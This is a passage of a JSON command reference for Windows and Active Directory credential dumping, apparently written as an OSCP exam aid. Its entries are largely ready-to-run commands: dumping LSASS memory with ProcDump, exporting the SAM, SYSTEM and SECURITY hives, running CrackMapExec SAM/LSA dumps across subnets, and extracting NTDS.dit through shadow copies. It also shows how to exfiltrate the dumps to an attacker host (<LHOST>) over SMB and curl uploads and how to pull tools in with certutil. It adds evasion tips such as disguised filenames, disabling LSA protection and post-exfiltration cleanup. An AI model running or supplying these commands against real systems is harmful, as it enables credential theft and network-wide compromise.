{
  "metadata": {
    "file_purpose": "Active Directory credential extraction techniques - SAM dump, LSASS dump, NTDS offline processing, CrackMapExec automation. Essential post-exploitation OSCP commands.",
    "oscp_relevance": "CRITICAL. After gaining admin access on Windows systems, extracting credentials is the PRIMARY lateral movement enabler. These commands harvest local account hashes, cached domain credentials, and service account passwords.",
    "educational_context": "Windows stores credentials in multiple locations: SAM database (local accounts), LSASS process memory (logged-in users), LSA secrets (service accounts), NTDS.dit (domain database on DCs). Different extraction methods required based on access level and target type."
  },
  "commands": [
    {
      "id": "ad-lsass-dump-procdump",
      "name": "Dump LSASS Memory with ProcDump",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
      "description": "Create memory dump of LSASS process using Sysinternals ProcDump. Contains cleartext passwords, NTLM hashes, and Kerberos tickets for all logged-in users. Transfer to Kali for offline Mimikatz analysis.",
      "variables": [],
      "flag_explanations": {
        "procdump.exe": "Microsoft Sysinternals tool for creating process memory dumps. Legitimate admin tool - often bypasses AV when Mimikatz is blocked. Signed by Microsoft. ADVANTAGE: No AV alerts, forensically cleaner than direct Mimikatz execution. DISADVANTAGE: Requires file transfer (lsass.dmp is 40-200MB). Downloaded from: https://docs.microsoft.com/sysinternals/downloads/procdump",
        "-accepteula": "Automatically accept Sysinternals EULA (no interactive prompt). Required for scripted/automated execution. Without this flag, procdump pauses waiting for EULA acceptance.",
        "-ma": "Full memory dump (Mini plus All memory). Captures complete process memory including heap, stacks, handles. CRITICAL for credential extraction - partial dumps miss credentials in heap memory. Alternative: -mm (mini dump, smaller but may miss creds).",
        "lsass.exe": "Local Security Authority Subsystem Service - Windows security process managing authentication. Runs with SYSTEM privileges. Contains: (1) Cleartext passwords (WDigest, if enabled), (2) NTLM hashes (all logged-in users), (3) Kerberos TGTs/TGSs, (4) Cached domain credentials. PID typically ~600-800.",
        "lsass.dmp": "Output filename. Can be any name. OPSEC TIP: Use innocuous names like 'svchost.dmp' or 'update.tmp'. File size: 40-200MB depending on system uptime and logged-in users."
      },
      "success_indicators": [
        "Output: 'ProcDump v10.x - Sysinternals process dump utility'",
        "Output: 'Dump 1 initiated: lsass.dmp'",
        "Output: 'Dump 1 complete: 67 MB written in X seconds'",
        "File created: lsass.dmp (40-200MB)",
        "No 'Access Denied' errors",
        "File transfers successfully to attacker machine"
      ],
      "failure_indicators": [
        "Access is denied",
        "Error writing dump file",
        "procdump.exe is not recognized",
        "Protected process",
        "Insufficient privileges"
      ],
      "troubleshooting": {
        "Access is denied": "Requires SYSTEM or Administrator privileges. Solution: Verify shell runs as SYSTEM (whoami). If Administrator, elevate to SYSTEM: psexec -s -i cmd.exe. Or use Mimikatz privilege::debug + sekurlsa::minidump instead.",
        "Error writing dump file": "Disk space insufficient or permission denied on output path. Solution: Write to user-writable directory: procdump.exe -accepteula -ma lsass.exe %TEMP%\\lsass.dmp. Or write to SMB share: procdump.exe -accepteula -ma lsass.exe \\\\<LHOST>\\share\\lsass.dmp",
        "Protected process": "PPL (Protected Process Light) enabled - Windows Defender Credential Guard. Solution: (1) Check if enabled: Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard. (2) If enabled, ProcDump fails. Alternative: Disable PPL (requires reboot + registry): reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f (reboot required). Or use mimikatz with PPL bypass (advanced).",
        "procdump.exe not recognized": "ProcDump not uploaded to target. Solution: Upload from Kali: smbserver.py share /opt/sysinternals/ (on Kali), then copy \\\\<LHOST>\\share\\procdump.exe . (on target). Or download directly: certutil -urlcache -f http://<LHOST>/procdump.exe procdump.exe",
        "Dump file won't transfer (too large)": "File 100+ MB. Solution: Compress first: powershell Compress-Archive lsass.dmp lsass.zip. Or split: fsutil file createnew dummy 10485760 (split with certutil or PowerShell). Or use SMB server: copy lsass.dmp \\\\<LHOST>\\share\\",
        "AV deletes procdump.exe": "Rare but possible. Solution: Rename: ren procdump.exe svchost.exe. Or upload to alternate path: C:\\Windows\\Temp\\. Or use process hollowing/injection to run ProcDump in memory (advanced)."
      },
      "prerequisites": [
        "windows-psexec-system-shell"
      ],
      "next_steps": [],
      "alternatives": [],
      "tags": [
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_DUMPING",
        "LSASS",
        "PROCDUMP",
        "WINDOWS",
        "SYSINTERNALS",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "notes": "PREFERRED LSASS dumping method when Mimikatz is blocked by AV. ProcDump is Microsoft-signed and legitimate admin tool - bypasses most AV. OSCP WORKFLOW: (1) Get SYSTEM shell (psexec -s -i cmd), (2) procdump lsass, (3) Transfer to Kali (SMB server or HTTP upload), (4) Run Mimikatz on Kali: mimikatz.exe 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' exit. ADVANTAGES: No AV alerts, offline analysis (no LSASS manipulation on target), forensically cleaner. DISADVANTAGES: Large file transfer (40-200MB), requires stable shell for transfer. Time estimate: 10-30 seconds (dump) + 30-180 seconds (transfer depending on connection).\n\nMANUAL ALTERNATIVES:\n\nFind LSASS PID first (if antivirus monitors 'lsass.exe' string):\ntasklist /fi \"imagename eq lsass.exe\"\nprocdump.exe -accepteula -ma <PID> lsass.dmp\n\nDump with compression (smaller transfer):\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\npowershell Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip\n\nDirect dump to SMB share (no local storage):\nsmbserver.py share /tmp/ (on Kali)\nprocdump.exe -accepteula -ma lsass.exe \\\\<LHOST>\\share\\lsass.dmp\n\nDump to temp directory (avoid permission issues):\nprocdump.exe -accepteula -ma lsass.exe %TEMP%\\lsass.dmp\ncd %TEMP% && copy lsass.dmp \\\\<LHOST>\\share\\\n\nProcess on Kali with Mimikatz (Windows binary via Wine):\nwine mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\n\nProcess on Kali with pypykatz (Python alternative):\npypykatz lsa minidump lsass.dmp > creds.txt\n\nWDigest cleartext password extraction:\n# Windows 2008 R2 and earlier store cleartext passwords in LSASS (WDigest)\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::wdigest\" \"exit\"\n\nKerberos ticket extraction:\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::tickets /export\" \"exit\"\n\nOPSEC CONSIDERATIONS:\n- Event ID 10 (process access) logged when LSASS accessed\n- Sysmon Event ID 10 (LSASS access) if Sysmon deployed\n- Defenders monitor for: lsass.exe in command line, procdump.exe accessing lsass, large .dmp files in unusual locations\n- Mitigation: Use alternate names (svchost.dmp), delete after transfer, dump to user profile (blend with legitimate activity)\n\nFILE TRANSFER OPTIONS:\n1. SMB: copy lsass.dmp \\\\<LHOST>\\share\\ (fastest for large files)\n2. HTTP upload: curl -X POST -F file=@lsass.dmp http://<LHOST>:8080/upload\n3. certutil encode: certutil -encode lsass.dmp lsass.txt (base64, then copy/paste)\n4. PowerShell: Invoke-WebRequest -Uri http://<LHOST>:8080/upload -Method POST -InFile lsass.dmp\n\nTIME ESTIMATE:\nDump: 10-30 seconds (depends on LSASS size)\nTransfer: 30-180 seconds (40-200MB file, depends on connection speed)\nMimikatz processing: 5-15 seconds\nTotal: 1-4 minutes"
    },
    {
      "id": "ad-sam-dump-reg-save",
      "name": "Dump SAM and SYSTEM Hives with reg save",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
      "description": "Export SAM and SYSTEM registry hives for offline local account password hash extraction. Requires local admin. Use secretsdump.py on Kali to extract NTLM hashes.",
      "variables": [],
      "flag_explanations": {
        "reg save": "Windows registry export command. Creates binary hive file backup. Requires Administrator or SYSTEM privileges. CRITICAL: Must export BOTH SAM and SYSTEM - SAM contains password hashes (encrypted), SYSTEM contains boot key (decryption key). Cannot decrypt SAM without SYSTEM hive.",
        "HKLM\\SAM": "HKEY_LOCAL_MACHINE\\SAM - Security Account Manager database. Contains local user account information including NTLM password hashes (encrypted with SysKey from SYSTEM hive). Includes: Administrator, Guest, and all local user accounts. Does NOT include domain accounts (those are in NTDS.dit on DC).",
        "sam.hive": "Output filename for SAM database. Can be any name. Typical size: 256KB - 2MB. Contains encrypted hashes for all local accounts on this machine only.",
        "HKLM\\SYSTEM": "System hive containing boot key (SysKey) used to encrypt SAM password hashes. Also contains: service configurations, driver settings, system parameters. Required for SAM decryption.",
        "system.hive": "Output filename for SYSTEM hive. Can be any name. Typical size: 10-20MB. Contains decryption key for SAM hashes.",
        "&&": "Command chaining - executes both commands sequentially. If first command fails, second still attempts. Use & (single ampersand) for unconditional execution, or || (double pipe) for 'or' logic."
      },
      "success_indicators": [
        "Output: 'The operation completed successfully.' (appears twice)",
        "Files created: sam.hive and system.hive",
        "sam.hive size: 256KB - 2MB",
        "system.hive size: 10-20MB",
        "No 'Access is denied' errors",
        "Files readable (not locked by system)"
      ],
      "failure_indicators": [
        "ERROR: Access is denied",
        "The process cannot access the file",
        "The system cannot find the path specified",
        "Insufficient privileges"
      ],
      "troubleshooting": {
        "Access is denied": "Requires Administrator or SYSTEM. Solution: Verify privilege: whoami /groups (look for 'S-1-5-32-544' = Administrators). If regular admin, elevate to SYSTEM: psexec -s -i cmd.exe or: PsExec.exe -accepteula -s cmd.exe",
        "The process cannot access the file": "Registry hives are locked by system. Solution: This is normal for SAM/SYSTEM. Use 'reg save' (not 'copy' or 'xcopy'). Reg save creates snapshot while hives are in use. Verify command syntax exactly: reg save HKLM\\SAM sam.hive (double backslash required in command line).",
        "File already exists": "Previous dump file present. Solution: Delete old files: del sam.hive system.hive. Or use different names: reg save HKLM\\SAM sam2.hive",
        "Insufficient disk space": "Not enough space in current directory. Solution: Dump to user temp: reg save HKLM\\SAM %TEMP%\\sam.hive && reg save HKLM\\SYSTEM %TEMP%\\system.hive. Or dump to network share: reg save HKLM\\SAM \\\\<LHOST>\\share\\sam.hive",
        "Files won't transfer (locked)": "Windows holds file handle. Solution: Close all applications, or rename before transfer: ren sam.hive sam.bak. Or use 'copy' (creates new handle): copy sam.hive sam2.hive && copy sam2.hive \\\\<LHOST>\\share\\",
        "Cannot extract hashes on Kali": "Missing SYSTEM hive or using wrong tool. Solution: MUST have both SAM and SYSTEM. Use impacket-secretsdump: impacket-secretsdump -sam sam.hive -system system.hive LOCAL. For pypykatz: pypykatz registry --sam sam.hive system.hive"
      },
      "prerequisites": [
        "enable-remote-registry",
        "crackmapexec-validate-admin"
      ],
      "next_steps": [
        "impacket-secretsdump",
        "hashcat-ntlm-crack",
        "ad-pass-the-hash-crackmapexec"
      ],
      "alternatives": [
        "crackmapexec-sam-dump",
        "impacket-secretsdump"
      ],
      "tags": [
        "CREDENTIAL_DUMPING",
        "SAM",
        "REGISTRY",
        "WINDOWS",
        "LOCAL_ACCOUNTS",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "notes": "STANDARD method for local account hash extraction on Windows workstations and member servers. Advantage over LSASS dump: Smaller files (< 25MB total), no AV alerts (reg save is legitimate admin operation), offline processing. OSCP WORKFLOW: (1) Get admin shell, (2) reg save both hives, (3) Transfer to Kali (SMB/HTTP), (4) Extract hashes: impacket-secretsdump -sam sam.hive -system system.hive LOCAL. Output format: USERNAME:RID:LM:NTLM::: (Hashcat mode 1000). Use for Pass-the-Hash lateral movement or password cracking. Time estimate: 2-5 seconds (export) + 5-30 seconds (transfer) + 2 seconds (hash extraction).\n\nMANUAL ALTERNATIVES:\n\nExport to temp directory:\nreg save HKLM\\SAM %TEMP%\\sam.hive\nreg save HKLM\\SYSTEM %TEMP%\\system.hive\ncd %TEMP%\n\nExport directly to SMB share (no local storage):\nsmbserver.py share /tmp/ (on Kali)  \nreg save HKLM\\SAM \\\\<LHOST>\\share\\sam.hive\nreg save HKLM\\SYSTEM \\\\<LHOST>\\share\\system.hive\n\nExport with alternate names (OPSEC):\nreg save HKLM\\SAM update.tmp\nreg save HKLM\\SYSTEM svchost.dat\n\nExtract hashes on Kali with secretsdump:\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL\n# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:: ...\n\nExtract specific user:\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL | grep Administrator\n\nExtract with pypykatz (Python alternative):\npypykatz registry --sam sam.hive system.hive > hashes.txt\n\nParse NTLM hashes only (for hashcat):\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL | cut -d':' -f4 > ntlm.txt\nhashcat -m 1000 ntlm.txt rockyou.txt\n\nPass-the-Hash with extracted hash:\nimpacket-psexec -hashes :<NTLM_HASH> './administrator@<TARGET_IP>'\n\nExport SECURITY hive (LSA secrets - additional credentials):\nreg save HKLM\\SECURITY security.hive\nimpacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL\n\nAutomated script (all hives + cleanup):\n@echo off\nreg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\nreg save HKLM\\SECURITY security.hive\ncopy *.hive \\\\<LHOST>\\share\\\ndel sam.hive system.hive security.hive\n\nWHAT YOU GET:\n- Local account NTLM hashes (Administrator, backup accounts, service accounts)\n- LM hashes (if enabled on old systems - rarely useful)\n- LSA secrets (if SECURITY hive exported): service account passwords, machine account password, cached domain credentials\n\nWHAT YOU DON'T GET:\n- Domain account hashes (need DCSync or NTDS.dit)\n- Cleartext passwords (need LSASS dump + Mimikatz)\n- Kerberos tickets (need LSASS dump)\n- Currently logged-in user credentials (need LSASS dump)\n\nUSE CASES:\n- Workstation local admin hash extraction\n- Member server local account compromise\n- Backup admin account discovery\n- Pass-the-Hash preparation for lateral movement\n- Offline password cracking\n\nOPSEC:\n- Event ID 4656/4663 (registry access) logged\n- Sysmon Event ID 12/13 (registry modification) if deployed\n- Low suspicion - reg save is legitimate admin task\n- Files should be deleted after exfiltration\n\nFILE TRANSFER:\n1. SMB: copy *.hive \\\\<LHOST>\\share\\ (fastest)\n2. HTTP upload: curl -X POST -F sam=@sam.hive -F system=@system.hive http://<LHOST>:8080/upload\n3. Base64 encode (small files): certutil -encode sam.hive sam.txt\n4. PowerShell: IWR -Uri http://<LHOST>:8080/upload -Method POST -InFile sam.hive\n\nCLEANUP:\ndel sam.hive system.hive (on target after exfiltration)\n\nTIME ESTIMATE:\nExport hives: 2-5 seconds\nTransfer (SMB): 5-30 seconds (depends on connection, typically <25MB total)\nHash extraction on Kali: 1-2 seconds  \nTotal: 10-40 seconds"
    },
    {
      "id": "crackmapexec-sam-dump",
      "name": "CrackMapExec - Automated SAM Dump",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --sam",
      "description": "Automatically dump local account hashes (SAM database) from remote Windows system using CrackMapExec. Combines reg save + secretsdump in one command. Cleaner than manual SAM extraction.",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "192.168.50.100",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Local administrator username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password for authentication",
          "example": "P@ssw0rd!",
          "required": true
        }
      ],
      "flag_explanations": {
        "crackmapexec smb": "SMB-based CrackMapExec module. Connects to target via SMB (port 445) for remote administration. ADVANTAGE: Automated credential dumping, cleaner than manual methods, automatically extracts and parses hashes. Part of standard OSCP toolkit.",
        "--sam": "Dump SAM database (local account hashes). CME automatically: (1) Authenticates to target, (2) Uses reg save to export SAM + SYSTEM hives remotely, (3) Downloads hives, (4) Extracts hashes with secretsdump, (5) Cleans up remote files. Output: LOCAL\\username:NTLM hash format.",
        "-u <USERNAME>": "Username for authentication. Can be local account or domain account with local admin rights on target. For local accounts, prefix with './': -u ./administrator. For domain accounts: -u 'DOMAIN/username'.",
        "-p <PASSWORD>": "Password for authentication. Use single quotes if password contains special characters: -p 'P@ss!w0rd'. Alternative: --local-auth flag forces local account authentication (bypasses domain).",
        "Optional: -H <NTLM_HASH>": "Pass-the-Hash instead of password. Format: -H <NTLM> or -H <LM>:<NTLM>. Example: -H 8846f7eaee8fb117ad06bdd830b7586c. Useful when you have hash but not cleartext password.",
        "Optional: --local-auth": "Force local account authentication (bypass domain). Use when targeting workgroup systems or when username exists both locally and in domain: crackmapexec smb <TARGET> -u administrator -p <PASS> --local-auth --sam"
      },
      "success_indicators": [
        "Output: 'SMB <TARGET> 445 <HOSTNAME> [+] <USER>:<PASS> (Pwn3d!)'",
        "Output: '[*] Dumping SAM hashes'",
        "Output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::'",
        "Hashes displayed for all local accounts",
        "No authentication errors"
      ],
      "failure_indicators": [
        "[-] <TARGET>:445 <HOSTNAME> STATUS_LOGON_FAILURE",
        "[-] <TARGET>:445 <HOSTNAME> STATUS_ACCESS_DENIED",
        "[Errno 111] Connection refused",
        "[-] Error retrieving host information",
        "SMB SessionError"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS> (without --sam, just test auth). Check password case sensitivity. Try local account: -u ./administrator --local-auth",
        "STATUS_ACCESS_DENIED": "User lacks admin rights. Solution: Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> (should show 'Pwn3d!'). User must be in local Administrators group. Try different user or escalate privileges.",
        "Connection refused": "SMB port 445 blocked. Solution: Verify: sudo nmap -p 445 -Pn <TARGET>. Check firewall rules. If only RDP available, use alternative: RDP to target \u2192 run reg save manually.",
        "Error retrieving SAM": "Registry access failed. Possible reasons: (1) Endpoint protection blocking reg save, (2) SAM database locked, (3) Insufficient permissions. Solution: Try manual method: reg save HKLM\\SAM + impacket-secretsdump. Or use --lsa flag for LSA secrets instead.",
        "crackmapexec command not found": "CME not installed. Solution: Install: sudo apt install crackmapexec (Kali) or pipx install crackmapexec. Verify: which crackmapexec"
      },
      "prerequisites": [],
      "next_steps": [
        "windows-hashcat-crack-ntlm",
        "ad-pass-the-hash-impacket-psexec"
      ],
      "alternatives": [
        "ad-sam-dump-reg-save"
      ],
      "tags": [
        "CRACKMAPEXEC",
        "CREDENTIAL_DUMPING",
        "SAM",
        "SMB",
        "AUTOMATION",
        "OSCP:HIGH",
        "KALI"
      ],
      "oscp_relevance": "high",
      "notes": "FASTEST SAM dump method - fully automated extraction and parsing. Combines reg save + secretsdump + cleanup in one command. OSCP ADVANTAGE: No need to manually transfer files or run separate extraction - CME outputs hashes directly. WHEN TO USE: Quick SAM harvesting across multiple targets, automated credential dumping in large networks. DISADVANTAGE: Less stealthy than manual reg save (multiple SMB connections), CME may be flagged by EDR. Time estimate: 5-15 seconds per target.\n\nMANUAL ALTERNATIVES:\n\nPass-the-Hash:\ncrackmapexec smb <TARGET> -u <USER> -H <NTLM> --sam\n\nLocal account authentication:\ncrackmapexec smb <TARGET> -u administrator -p <PASS> --local-auth --sam\n\nDomain account with local admin rights:\ncrackmapexec smb <TARGET> -u 'DOMAIN/admin' -p <PASS> --sam\n\nMultiple targets (subnet):\ncrackmapexec smb 192.168.50.0/24 -u administrator -p <PASS> --sam\n\nFrom file of targets:\ncrackmapexec smb targets.txt -u administrator -p <PASS> --sam\n\nDump LSA secrets (additional credentials):\ncrackmapexec smb <TARGET> -u <USER> -p <PASS> --lsa\n\nDump both SAM and LSA:\ncrackmapexec smb <TARGET> -u <USER> -p <PASS> --sam --lsa\n\nSave output to file:\ncrackmapexec smb <TARGET> -u <USER> -p <PASS> --sam > sam_hashes.txt\n\nCombine with password spraying:\ncrackmapexec smb <TARGET> -u users.txt -p <PASS> --sam --continue-on-success\n\nOUTPUT FORMAT:\nSMB <TARGET> 445 <HOSTNAME> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::\n                              ^USERNAME   ^RID ^LM_HASH                       ^NTLM_HASH\n\nPARSING OUTPUT:\nExtract NTLM hashes only:\ncrackmapexec smb <TARGET> -u <USER> -p <PASS> --sam | grep \"::\" | cut -d':' -f4\n\nExtract Administrator hash:\ncrackmapexec smb <TARGET> -u <USER> -p <PASS> --sam | grep Administrator | cut -d':' -f4\n\nUSE CASES:\n- Quick local account hash harvesting\n- Automated credential dumping across multiple workstations\n- Pass-the-Hash attack preparation\n- Finding password reuse (same local admin password on multiple machines)\n\nCOMPARISON TO ALTERNATIVES:\nManual reg save: More steps, requires file transfer, more control\nCME --sam: Automated, one command, faster, less granular control\nimpacket-secretsdump -sam: Offline processing, requires pre-dumped hives\n\nLATERAL MOVEMENT WORKFLOW:\n1. Credential discovery: crackmapexec smb <TARGET> -u <USER> -p <PASS> --sam\n2. Extract Administrator hash from output\n3. Pass-the-Hash to other machines: crackmapexec smb 192.168.50.0/24 -u administrator -H <HASH> --sam\n4. Build credential database, identify password reuse patterns\n5. Escalate to domain admin via credential chaining\n\nTIME ESTIMATE:\nSingle target: 5-15 seconds\nSubnet scan (10 hosts): 30-90 seconds  \nLarge network (100 hosts): 5-15 minutes"
    },
    {
      "id": "ad-dcsync-ntds-credentials",
      "name": "Extract Credentials from Offline NTDS.dit",
      "category": "post-exploit",
      "subcategory": "credential-dumping",
      "command": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL",
      "description": "Offline extraction of ALL domain credentials from NTDS.dit database file. Use after exfiltrating NTDS.dit and SYSTEM hive from Domain Controller. Extracts thousands of hashes for entire AD domain.",
      "variables": [],
      "flag_explanations": {
        "impacket-secretsdump": "Impacket credential extraction tool. With -ntds flag, processes offline NTDS.dit database (Active Directory database file from Domain Controller). ADVANTAGE: Offline processing on attacker machine - no DC connection needed, no network traffic, no additional DC logs. DISADVANTAGE: Requires NTDS.dit exfiltration (multi-GB file).",
        "-ntds ntds.dit": "Path to NTDS.dit file (Active Directory database). Located on DC at C:\\Windows\\NTDS\\ntds.dit. Contains: ALL domain user hashes, ALL computer account hashes, ALL group memberships, Domain SID, GPO information, etc. File size: 100MB - 50GB+ (depending on domain size). CRITICAL: File must be exported via Volume Shadow Copy (vssadmin/ntdsutil) - cannot copy directly while DC running.",
        "-system system.hive": "Path to SYSTEM registry hive from same DC. Contains boot key (SysKey) required to decrypt NTDS.dit hashes. Must match the DC where NTDS.dit was extracted. Export with: reg save HKLM\\SYSTEM system.hive (on DC).",
        "LOCAL": "Keyword indicating offline/local processing (not remote connection). Tells secretsdump to process files on local Kali filesystem instead of connecting to remote target.",
        "Optional: -history": "Extract password history (previous passwords). Useful for password pattern analysis and cracking old passwords that may still be valid elsewhere. Example: -ntds ntds.dit -system system.hive -history LOCAL",
        "Optional: -outputfile <PREFIX>": "Save output to files instead of stdout. Creates: <PREFIX>.ntds (hashes), <PREFIX>.cleartext (cleartext passwords if any), <PREFIX>.kerberos (Kerberos keys). Example: -outputfile corp_domain"
      },
      "success_indicators": [
        "Output: '[*] Target system is: LOCAL'",
        "Output: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)'",
        "Output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::'",
        "Output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::'",
        "Hundreds or thousands of hash lines (depending on domain size)",
        "Output: '[*] Cleaning up...'",
        "Hash format: DOMAIN\\username:uid:lm:ntlm:::"
      ],
      "failure_indicators": [
        "ERROR: Cannot open ntds.dit",
        "ERROR: Cannot open system.hive",
        "ERROR: Incorrect boot key",
        "ntds.dit: No such file or directory",
        "ImportError: No module named 'impacket'",
        "ERROR: The database is not in a clean state"
      ],
      "troubleshooting": {
        "Cannot open ntds.dit": "File path wrong or permissions issue. Solution: Verify file exists: ls -lh ntds.dit. Check permissions: chmod 644 ntds.dit. Verify not corrupted: file ntds.dit (should show 'Extensible storage engine DataBase'). Try absolute path: impacket-secretsdump -ntds /full/path/to/ntds.dit ...",
        "Cannot open system.hive": "SYSTEM hive missing or wrong path. Solution: Verify file: ls -lh system.hive. CRITICAL: SYSTEM hive must be from SAME DC as NTDS.dit. If mismatch, decryption fails. Re-extract: reg save HKLM\\SYSTEM system.hive (on same DC).",
        "Incorrect boot key": "SYSTEM hive does NOT match NTDS.dit (extracted from different DC). Solution: Re-export SYSTEM hive from correct DC. Ensure both files from same source. Check extraction timestamp.",
        "Database not in clean state": "NTDS.dit was copied while DC running (file inconsistent). Solution: Must extract via Volume Shadow Copy: (1) vssadmin create shadow /for=C:, (2) copy <SHADOW_PATH>\\Windows\\NTDS\\ntds.dit, (3) vssadmin delete shadows /for=C: /quiet. Or use ntdsutil for clean extraction.",
        "No module named 'impacket'": "Impacket not installed on Kali. Solution: sudo apt install impacket-scripts OR pip3 install impacket. Verify: which impacket-secretsdump",
        "Too much output (10,000+ lines)": "Large domain. Solution: Redirect to file: impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL > all_hashes.txt. Filter specific users: grep -i administrator all_hashes.txt. Extract NTLM column: cut -d':' -f4 all_hashes.txt > ntlm.txt"
      },
      "prerequisites": [],
      "next_steps": [
        "windows-hashcat-crack-ntlm-file",
        "ad-golden-ticket-mimikatz-create"
      ],
      "alternatives": [],
      "tags": [
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_DUMPING",
        "NTDS",
        "OFFLINE_ANALYSIS",
        "IMPACKET",
        "OSCP:MEDIUM",
        "KALI"
      ],
      "oscp_relevance": "medium",
      "notes": "COMPLETE domain credential harvest via offline NTDS.dit processing. WHEN TO USE: After exfiltrating NTDS.dit from DC (via vssadmin/ntdsutil), for comprehensive password analysis, when DCSync is blocked or logged. ADVANTAGE: Offline processing (no DC interaction after exfiltration), complete domain view (all users/computers/groups). DISADVANTAGE: Requires NTDS.dit exfiltration (multi-GB file, high risk). OSCP EXAM: Rarely needed (DCSync with secretsdump -just-dc faster). More common in labs for comprehensive credential analysis. Time estimate: 30 seconds - 5 minutes (depends on NTDS.dit size).\n\nMANUAL ALTERNATIVES:\n\nExtract with password history:\nimpacket-secretsdump -ntds ntds.dit -system system.hive -history LOCAL\n\nSave to files:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -outputfile corp_dump\n# Creates: corp_dump.ntds, corp_dump.secrets, corp_dump.kerberos\n\nExtract specific users only:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -i \"admin\\|krbtgt\\|service\"\n\nParse NTLM hashes only (for Hashcat):\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep \"::\" | cut -d':' -f4 > ntlm_hashes.txt\nhashcat -m 1000 ntlm_hashes.txt rockyou.txt\n\nExtract krbtgt for Golden Ticket:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep krbtgt\n\nCount total user accounts:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -c \"::\"\n\nNTDS.DIT EXTRACTION METHODS:\n\n1. Volume Shadow Copy (VSS) - RECOMMENDED:\nvssadmin create shadow /for=C:\ncopy <SHADOW_PATH>\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\nvssadmin delete shadows /for=C: /quiet\nreg save HKLM\\SYSTEM C:\\Temp\\system.hive\n\n2. ntdsutil (older method):\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\IFM\" q q\n# Creates ntds.dit in C:\\Temp\\IFM\\Active Directory\\\n\n3. PowerShell (VSS automation):\n$shadow = (gwmi -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible')\n$id = $shadow.ShadowID  \n$path = (gwmi Win32_ShadowCopy | ?{$_.ID -eq $id}).DeviceObject\ncmd /c copy \"$path\\Windows\\NTDS\\ntds.dit\" C:\\Temp\\ntds.dit\n(gwmi Win32_ShadowCopy | ?{$_.ID -eq $id}).Delete()\n\n4. CrackMapExec automation:\ncrackmapexec smb <DC_IP> -u <DA_USER> -p <PASS> --ntds vss\n# Automatically extracts, dumps, and cleans up\n\nFILE TRANSFER (NTDS.dit is large - 100MB to 50GB):\n\n1. Compress first:\n7z a -tgzip ntds.dit.gz ntds.dit (reduces to ~10-20% original size)\ncopy ntds.dit.gz \\\\<LHOST>\\share\\\n\n2. Split if too large:\nfsutil file createnew dummy 104857600\ncertutil -split -f ntds.dit 100000000 ntds.dit.part\n# Transfer parts separately, then rejoin on Kali: cat ntds.dit.part* > ntds.dit\n\n3. SMB server (direct transfer):\nsmbserver.py share /tmp/ (on Kali)\ncopy ntds.dit \\\\<LHOST>\\share\\ (on DC)\n\n4. HTTP upload (compressed):\n7z a ntds.dit.gz ntds.dit\ncurl -X POST -F file=@ntds.dit.gz http://<LHOST>:8080/upload\n\nOUTPUT ANALYSIS:\n\nFind enabled users (UAC flag):\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -v \"ACCOUNTDISABLE\"\n\nFind admin accounts (RID 500-520):\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep \":50[0-9]:\"\n\nFind computer accounts:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep \"\\$:\"\n\nFind service accounts (common naming):\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | grep -i \"svc\\|sql\\|backup\\|service\"\n\nPassword analysis with hashcat:\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | cut -d':' -f4 | sort -u > unique_hashes.txt\nhashcat -m 1000 unique_hashes.txt rockyou.txt -r best64.rule --force\n# Identifies weak passwords across entire domain\n\nTIME ESTIMATE:\nExtraction (VSS): 30-120 seconds (depends on 